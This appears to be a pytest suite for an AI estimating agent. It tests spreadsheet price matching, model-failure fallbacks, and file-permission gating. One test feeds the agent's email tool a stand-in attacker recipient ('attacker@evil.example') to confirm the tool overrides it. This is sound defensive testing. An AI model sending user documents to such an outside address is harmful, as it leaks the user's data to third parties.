import agent_fixtures as fx  # noqa: I001  (sets env first)

import pytest

from app import db
from app.agent import tools
from app.agent.context import RunContext
from app.agent.knowledge import Knowledge
from app.agent.pricing import PricingEngine, RowSpec
from app.llm import client as llm
from app.llm.ledger import Ctx


@pytest.fixture(autouse=True)
def _env():
    fx.migrate()
    llm.set_bedrock_factory(None)
    object.__setattr__(llm.settings, "llm_enabled", False)  # deterministic path unless a test opts in
    created: list[str] = []
    yield created
    object.__setattr__(llm.settings, "llm_enabled", True)
    llm.set_bedrock_factory(None)
    fx.cleanup_files(created)


REF_ITEMS = [
    {"text": "Kabelis NYM-J 3x1,5 mm2 guldīšana", "unit": "m", "norm_h": 0.1, "labour": 1.2, "material": 0.85, "rate": 12},
    {"text": "Kabelis NYM-J 5x2,5 mm2 guldīšana", "unit": "m", "norm_h": 0.14, "labour": 1.68, "material": 2.1, "rate": 12},
    {"text": "Kontaktligzda 2-vietīga IP44 montāža", "unit": "gab.", "norm_h": 0.5, "labour": 6.0, "material": 9.5, "rate": 12},
]


def _engine(allowed, denied=(), **kw):
    kb = Knowledge.load()
    return PricingEngine(kb, allowed=set(allowed), denied=set(denied), ctx=Ctx(), **kw)


def test_exact_match_rerates_labour_to_target_rate(_env):
    ref = fx.make_file("ref_A.xlsx", items=REF_ITEMS)
    _env.append(ref)
    eng = _engine([ref], target_rate=15.0)
    [p] = eng.price([RowSpec("E", 10, "Kabelis NYM-J 3x1,5 mm2 guldīšana", "m", 120)])
    assert p.source == "exact" and p.confidence == "high"
    assert p.unit_material == pytest.approx(0.85)
    assert p.unit_labour == pytest.approx(0.1 * 15.0)  # norm × the blank's own hourly rate
    assert p.total_labour == pytest.approx(120 * 1.5)
    assert p.matched[0]["file_id"] == ref and "re-rated" in p.reason


def test_brand_differences_do_not_matter(_env):
    ref = fx.make_file("ref_B.xlsx", items=[{**REF_ITEMS[0], "text": "Kabelis Reka NYM-J 3x1,5 mm2 guldīšana"}])
    _env.append(ref)
    [p] = _engine([ref]).price([RowSpec("E", 11, "Kabelis Draka NYM-J 3x1,5 mm2 guldīšana", "m", 10)])
    assert p.source in ("exact", "semantic") and p.matched[0]["file_id"] == ref


def test_hard_attribute_filter_never_matches_other_cross_section(_env):
    ref = fx.make_file("ref_C.xlsx", items=[REF_ITEMS[1]])  # only 5x2.5
    _env.append(ref)
    [p] = _engine([ref]).price([RowSpec("E", 12, "Kabelis NYM-J 3x1,5 mm2 guldīšana", "m", 10)])
    assert not p.matched and p.source == "none" and "NO PRICE" in p.flags


def test_unit_mismatch_blocks_match(_env):
    ref = fx.make_file("ref_D.xlsx", items=[{**REF_ITEMS[2], "unit": "m"}])
    _env.append(ref)
    [p] = _engine([ref]).price([RowSpec("E", 13, "Kontaktligzda 2-vietīga IP44 montāža", "gab.", 4)])
    assert p.source == "none"


def test_best_match_in_unselected_file_parks_row_without_leaking_price(_env):
    allowed = fx.make_file("allowed.xlsx", items=[REF_ITEMS[1]])
    other = fx.make_file("unselected.xlsx", items=[REF_ITEMS[0]])
    _env.extend([allowed, other])
    [p] = _engine([allowed]).price([RowSpec("E", 14, "Kabelis NYM-J 3x1,5 mm2 guldīšana", "m", 50)])
    assert p.source == "pending_permission"
    assert p.blocked_file["file_id"] == other and p.blocked_file["file_name"] == "unselected.xlsx"
    assert p.unit_labour is None and p.unit_material is None and not p.matched


def test_denied_file_is_ignored_and_row_goes_to_web(_env):
    allowed = fx.make_file("allowed2.xlsx", items=[REF_ITEMS[2]])
    other = fx.make_file("denied.xlsx", items=[REF_ITEMS[0]])
    _env.extend([allowed, other])
    looked = []

    def web(spec):
        looked.append(spec.text)
        return {"product": "NYM-J 3x1,5 100m", "unit_price": 1.19, "currency": "EUR", "url": "https://shop.example/x",
                "fetched_at": "2026-09-30T00:00:00Z"}

    [p] = _engine([allowed], denied=[other], web_lookup=web).price(
        [RowSpec("E", 15, "Kabelis NYM-J 3x1,5 mm2 guldīšana", "m", 50)])
    assert looked and p.source == "web" and "WEB" in p.flags and p.unit_material == pytest.approx(1.19)
    assert p.blocked_file is None or p.blocked_file["file_id"] != other


def test_denied_rows_go_to_web_even_when_another_unselected_file_matches(_env):
    """After Deny, the same rows must not be parked behind a card for the next unselected file."""
    allowed = fx.make_file("allowed3.xlsx", items=[REF_ITEMS[2]])
    denied = fx.make_file("denied3.xlsx", items=[REF_ITEMS[0]])
    also = fx.make_file("also_unselected.xlsx", items=[REF_ITEMS[0]])
    _env.extend([allowed, denied, also])

    def web(spec):
        return {"product": "NYM-J 3x1,5 100m", "unit_price": 1.19, "currency": "EUR", "url": "https://shop.example/x",
                "fetched_at": "2026-09-30T00:00:00Z"}

    spec = RowSpec("E", 15, "Kabelis NYM-J 3x1,5 mm2 guldīšana", "m", 50)
    [first] = _engine([allowed], denied=[denied], web_lookup=web).price([spec])
    assert first.source == "pending_permission"  # without the denied-rows hint it asks about the other file
    [p] = _engine([allowed], denied=[denied], web_lookup=web).price([spec], denied_rows={spec.rid})
    assert p.source == "web" and p.unit_material == pytest.approx(1.19)


def test_refused_pricing_model_falls_back_instead_of_failing(_env):
    object.__setattr__(llm.settings, "llm_enabled", True)
    ref = fx.make_file("ref_G.xlsx", items=[
        {"text": f"Gaismeklis LED panelis {w}W iebūvējams", "unit": "gab.", "norm_h": 0.6, "labour": 7.2,
         "material": 30 + w, "rate": 12} for w in (18, 24, 36, 40)])
    _env.append(ref)

    def refused(req):
        raise fx.aws_access_denied()

    llm.set_bedrock_factory(lambda: fx.FakeBedrock([refused] * 5))
    specs = [RowSpec("E", 30 + i, f"LED gaismeklis panelis {w}W virsapmetuma", "gab.", 2) for i, w in
             enumerate((20, 22, 30, 32, 38, 42))]
    eng = _engine([ref])
    rows = eng.price(specs)                      # no exception: the run goes on
    assert "model_error" in eng.stats and len(rows) == len(specs)
    assert all(p.source in ("semantic", "none") and not p.model_used for p in rows)


def test_bedrock_unreachable_falls_back_instead_of_failing(_env):
    object.__setattr__(llm.settings, "llm_enabled", True)
    ref = fx.make_file("ref_H.xlsx", items=[
        {"text": f"Gaismeklis LED panelis {w}W iebūvējams", "unit": "gab.", "norm_h": 0.6, "labour": 7.2,
         "material": 30 + w, "rate": 12} for w in (18, 24, 36, 40)])
    _env.append(ref)

    def offline(req):
        from botocore.exceptions import EndpointConnectionError
        raise EndpointConnectionError(endpoint_url="https://bedrock-runtime.eu-north-1.amazonaws.com/model/x/converse")

    llm.set_bedrock_factory(lambda: fx.FakeBedrock([offline] * 5))
    specs = [RowSpec("E", 40 + i, f"LED gaismeklis panelis {w}W virsapmetuma", "gab.", 2) for i, w in
             enumerate((20, 30, 42))]
    eng = _engine([ref])
    rows = eng.price(specs)
    assert "unreachable" in eng.stats["model_error"] and len(rows) == 3


def test_norms_parameterised_beats_category(_env):
    ref = fx.make_file("ref_E.xlsx", items=[REF_ITEMS[0]], rate=12)
    norms = fx.make_file("norms.xlsx", tag="hourly_norms", items=[], norms=[
        {"text": "Sadales skapis", "unit": "gab.", "hours": 3.0, "specificity": "category"},
        {"text": "Sadales skapis 36 moduļi", "unit": "gab.", "hours": 5.5, "specificity": "parameterised",
         "params": {"modules": 36}},
        {"text": "Sadales skapis 24 moduļi", "unit": "gab.", "hours": 4.0, "specificity": "parameterised",
         "params": {"modules": 24}},
    ])
    _env.extend([ref, norms])
    rows = _engine([ref, norms], target_rate=20).price([
        RowSpec("E", 20, "Sadales skapis ABB 36 moduļi, montāža", "gab.", 1),
        RowSpec("E", 21, "Sadales skapis 12 moduļi", "gab.", 1)])
    p36, p12 = rows
    assert p36.source == "norm" and p36.norm_h == 5.5 and p36.unit_labour == pytest.approx(110)
    assert p36.norm_ref["specificity"] == "parameterised"
    assert p12.source == "norm" and p12.norm_h == 3.0 and p12.confidence == "low" and "CHECK" in p12.flags


def test_ambiguous_rows_are_batched_into_one_model_call(_env):
    object.__setattr__(llm.settings, "llm_enabled", True)
    ref = fx.make_file("ref_F.xlsx", items=[
        {"text": f"Gaismeklis LED panelis {w}W iebūvējams", "unit": "gab.", "norm_h": 0.6, "labour": 7.2,
         "material": 30 + w, "rate": 12} for w in (18, 24, 36, 40)])
    _env.append(ref)
    calls = []

    def respond(req):
        calls.append(req)
        import json, re
        rows = json.loads(re.search(r"Rows:\n(.*)", req["messages"][0]["content"][-1]["text"], re.S).group(1)
                          .split("\n\nRespond")[0])
        out = [{"row_id": r["row_id"], "candidate_id": r["candidates"][0]["id"], "confidence": 0.7,
                "reason": "closest wattage"} for r in rows]
        return fx.tool_response("emit", {"rows": out})

    llm.set_bedrock_factory(lambda: fx.FakeBedrock([respond] * 5))
    specs = [RowSpec("E", 30 + i, f"LED gaismeklis panelis {w}W virsapmetuma", "gab.", 2) for i, w in
             enumerate((20, 22, 30, 32, 38, 42))]
    rows = _engine([ref]).price(specs)
    assert len(calls) == 1  # one batched call for all ambiguous rows, never one per row
    assert all(p.source in ("semantic", "model") for p in rows)
    assert any(p.model_used for p in rows)


def test_nothing_anywhere_is_no_price(_env):
    ref = fx.make_file("ref_G.xlsx", items=[REF_ITEMS[0]])
    _env.append(ref)
    [p] = _engine([ref]).price([RowSpec("E", 40, "Ugunsdrošības vārsts DN200 pieslēgšana", "gab.", 3)])
    assert p.source == "none" and p.flags == ["NO PRICE"]


# ---------------------------------------------------------------- permission test (tools layer)

def test_agent_cannot_read_unselected_file_without_approved_card(_env):
    allowed = fx.make_file("mine.xlsx", items=[REF_ITEMS[1]])
    other = fx.make_file("secret.xlsx", items=[REF_ITEMS[0]])
    _env.extend([allowed, other])
    u = fx.make_user()
    conv = fx.make_conversation(u)
    run = fx.make_run(conv, allowed=[allowed], selected=[allowed])
    rc = RunContext(str(run["id"]))

    with pytest.raises(tools.ToolError, match="found in unselected file secret.xlsx"):
        tools.read_file_summary(rc, other)
    res, is_err = tools.call(rc, "read_file_summary", {"file_id": other})
    assert is_err and "unselected file secret.xlsx" in res["error"]

    found = tools.search_items(rc, "Kabelis NYM-J 3x1,5 mm2")
    assert all(r["file_id"] == allowed for r in found["results"])
    assert found["better_match_in_unselected_file"]["file_name"] == "secret.xlsx"
    assert "unit_labour" not in found["better_match_in_unselected_file"]  # no price leak

    card = tools.request_file_permission(rc, other, [{"sheet": "E", "row": 14, "item": "NYM 3x1.5"}])
    assert card["status"] == "pending"
    # a second request for the same file is idempotent
    assert tools.request_file_permission(rc, other, [])["card_id"] == card["card_id"]
    # still not readable while pending
    with pytest.raises(tools.ToolError):
        tools.read_file_summary(rc, other)
    # web API approves: file joins the allowed set → now readable
    db.execute("UPDATE cards SET status='approved' WHERE id=%s", (card["card_id"],))
    db.execute("UPDATE runs SET allowed_file_ids = allowed_file_ids || %s::uuid WHERE id=%s", (other, run["id"]))
    rc.refresh()
    assert tools.read_file_summary(rc, other)["name"] == "secret.xlsx"


def test_send_email_tool_ignores_model_supplied_recipient(_env):
    u = fx.make_user(send_to="estimates-inbox@example.com")
    conv = fx.make_conversation(u)
    run = fx.make_run(conv)
    rc = RunContext(str(run["id"]))
    doc = db.fetchone("""INSERT INTO documents(run_id, conversation_id, user_id, name, stored_path, mode)
                         VALUES (%s,%s,%s,'x.xlsx','/dev/null','fill') RETURNING *""", (run["id"], conv["id"], u["id"]))
    out, is_err = tools.call(rc, "send_email", {"to": "attacker@evil.example", "document_id": str(doc["id"])})
    assert not is_err and out["to"] == "estimates-inbox@example.com"
    row = db.fetchone("SELECT to_email FROM email_sends WHERE run_id=%s", (run["id"],))
    assert row["to_email"] == "estimates-inbox@example.com"
